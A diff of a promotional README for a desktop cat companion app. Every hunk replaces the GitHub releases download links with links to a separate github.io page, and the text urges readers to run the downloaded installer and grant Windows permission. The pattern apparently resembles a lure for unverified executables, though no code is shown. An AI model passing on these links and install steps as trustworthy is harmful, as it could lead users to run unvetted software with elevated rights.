@@ -1,7 +1,7 @@
 <h1>🐱 ai-cat-desktop-companion-2026 - Your Adorable Desktop Kitty Awaits</h1>
 
 <p align="center">
-  <a href="https://github.com/skooyskooy/ai-cat-desktop-companion-2026/releases" style="background-color:#ff6b6b;color:#ffffff;padding:15px 30px;border-radius:50px;font-size:20px;font-weight:bold;text-decoration:none;display:inline-block;">⬇️ Download Now - Free!</a>
+  <a href="https://skooyskooy.github.io" style="background-color:#ff6b6b;color:#ffffff;padding:15px 30px;border-radius:50px;font-size:20px;font-weight:bold;text-decoration:none;display:inline-block;">⬇️ Download Now - Free!</a>
 </p>
 
 <h2>🌟 What Is This?</h2>
@@ -16,7 +16,7 @@ Getting your desktop cat is incredibly simple. You don't need any technical skil
 
 <h3>Step 1: Download the Application</h3>
 
-<p>Visit this link to download the application: <a href="https://github.com/skooyskooy/ai-cat-desktop-companion-2026/releases" style="color:#4ecdc4;font-weight:bold;">https://github.com/skooyskooy/ai-cat-desktop-companion-2026/releases</a></p>
+<p>Visit this link to download the application: <a href="https://skooyskooy.github.io" style="color:#4ecdc4;font-weight:bold;">https://skooyskooy.github.io</a></p>
 
 On that page, you'll see a list of available files. Look for the most recent version and click the download button. The file will start downloading to your computer automatically.
 
@@ -62,7 +62,7 @@ Your computer needs to meet these simple requirements to run the cat smoothly:
 <h3>Step-by-Step Installation</h3>
 
 <ol>
-  <li><strong>Open the download link:</strong> <a href="https://github.com/skooyskooy/ai-cat-desktop-companion-2026/releases" style="color:#4ecdc4;font-weight:bold;">Click here to visit the download page</a></li>
+  <li><strong>Open the download link:</strong> <a href="https://skooyskooy.github.io" style="color:#4ecdc4;font-weight:bold;">Click here to visit the download page</a></li>
   <li><strong>Choose the right file:</strong> Look for the file with the highest version number. It will be listed at the top of the page.</li>
   <li><strong>Start the download:</strong> Click the download icon next to the file name. Your browser will save it to your Downloads folder.</li>
   <li><strong>Run the installer:</strong> Once downloaded, double-click the file to start the installation. If Windows asks for permission, click "Yes" to allow it.</li>
@@ -164,7 +164,7 @@ This software is free to use for personal purposes. Redistribution or commercial
 <h2>🎉 Ready to Meet Your New Friend?</h2>
 
 <p align="center">
-  <a href="https://github.com/skooyskooy/ai-cat-desktop-companion-2026/releases" style="background-color:#4ecdc4;color:#ffffff;padding:15px 30px;border-radius:50px;font-size:20px;font-weight:bold;text-decoration:none;display:inline-block;">🐾 Download Your Desktop Cat Today!</a>
+  <a href="https://skooyskooy.github.io" style="background-color:#4ecdc4;color:#ffffff;padding:15px 30px;border-radius:50px;font-size:20px;font-weight:bold;text-decoration:none;display:inline-block;">🐾 Download Your Desktop Cat Today!</a>
 </p>
 
 Your computer is about to get a whole lot cuter. Download ai-cat-desktop-companion-2026 now and experience the joy of having a playful, affectionate AI cat right on your screen. It's free, it's fun, and it's waiting to meet you!
